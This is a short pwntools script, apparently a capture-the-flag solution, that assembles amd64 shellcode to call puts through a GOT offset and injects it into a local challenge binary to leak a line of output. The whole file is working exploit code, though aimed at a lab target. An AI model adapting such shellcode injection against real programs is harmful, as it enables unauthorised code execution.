from pwn import *
elf = ELF('./shellcode', checksec=False)

shellcode = asm(
    '''
    mov rdi, [rbp]
    add rdi, 0x200580 # offset of bss buffer
    call [rdi-0x68]   # offset of puts@got
    ret
    '''
, arch='amd64', os='linux')
p = elf.process()
log.info(f'shellcode length : {len(shellcode)}')
p.sendlineafter(b':', shellcode)
print(p.recvlines(3)[-1])
p.close()